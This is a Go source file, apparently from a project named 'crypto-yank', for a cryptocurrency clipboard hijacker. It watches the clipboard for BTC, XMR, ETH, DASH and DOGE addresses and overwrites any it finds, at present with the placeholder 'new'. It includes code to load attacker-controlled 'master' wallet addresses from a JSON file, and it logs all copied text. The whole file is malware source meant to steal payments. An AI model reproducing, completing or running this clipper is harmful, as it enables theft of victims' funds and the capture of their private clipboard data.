package main

import (
	"context"
	"crypto-yank/constants"
	"encoding/json"
	"errors"
	"golang.design/x/clipboard"
	"io/ioutil"
	"log"
	"os"
	"regexp"
)

// Holds what to replace clipboard with
type MasterAdresses struct {
	BtcAddress  string `json:"btc"`
	XmrAddress  string `json:"xmr"`
	EthAddress  string `json:"eth"`
	DashAddress string `json:"dash"`
	DogeAddress string `json:"doge"`
}

func main() {
	err := clipboard.Init()
	if err != nil {
		log.Fatalf("unable to init clipboard, %s", err.Error())
	}

	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)

	// Clipboard
	for data := range ch {
		regexMatch, err := replaceClipboard(string(data))
		if err == nil {
			clipboard.Write(clipboard.FmtText, []byte(regexMatch))
		}
		log.Printf("data:%s", string(data))
	}
}

// Go through all regex matches, compile regex for them,
// if match string replace all
func replaceClipboard(clipboardStr string) (string, error) {
	for _, regexMatch := range constants.RegexMatches {
		r, _ := regexp.Compile(regexMatch.RegexMatch)

		if r.MatchString(clipboardStr) {
			log.Printf("found: %s in clipboard, replaced", regexMatch.CryptoName)

			newStr := r.ReplaceAllString(clipboardStr, "new")
			return newStr, nil
		}
	}
	return "", errors.New("No match found")
}

func getMasterAddresses() (MasterAdresses, error) {
	var masterAddresses MasterAdresses // returning
	jsonFile, err := os.Open("constants/addresses.json")

	if err != nil {
		log.Fatalf("unable to open regex matches %s", err.Error())
		return masterAddresses, err
	}
	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		log.Fatalf("unable to get byteValue %s", err.Error())
		return masterAddresses, err
	}
	err = json.Unmarshal(byteValue, &masterAddresses)
	if err != nil {
		log.Fatalf("unable to unmarshal %s", err.Error())
		return masterAddresses, err
	}

	return masterAddresses, nil
}
